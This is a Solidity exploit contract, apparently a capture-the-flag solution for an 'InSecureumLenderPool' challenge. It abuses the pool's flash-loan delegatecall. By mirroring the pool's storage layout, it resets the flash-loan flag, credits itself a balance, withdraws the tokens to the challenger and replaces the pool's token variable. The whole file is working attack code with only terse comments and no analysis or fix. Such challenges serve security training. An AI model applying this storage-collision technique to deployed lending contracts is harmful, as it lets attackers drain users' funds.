// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {InSecureumLenderPool} from "../Challenge1.lenderpool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit1 {
    // Copy-paste state vars from lender pool (will be used when delegatecall)
    IERC20 public token;
    mapping(address => uint256) public balances;
    bool private _flashLoan;

    function start(
        InSecureumLenderPool pool,
        IERC20 tokenInsec,
        IERC20 tokenBor,
        uint256 amount,
        address challenger
    ) external {
        bytes memory callData = abi.encodeWithSelector(
            this.attack.selector,
            pool,
            tokenInsec,
            tokenBor,
            amount,
            challenger
        );
        pool.flashLoan(address(this), callData);
    }

    function attack(
        InSecureumLenderPool pool,
        IERC20 tokenInsec,
        IERC20 tokenBor,
        uint256 amount,
        address challenger
    ) external {
        // Change lender pool var _flashLoan to false before withdrawing
        _flashLoan = false;
        balances[address(this)] = amount;
        pool.withdraw(amount);
        tokenInsec.transfer(challenger, amount);
        // After withdraw change lender pool token var to IERC20(address tokenBoring)
        token = tokenBor;
    }
}
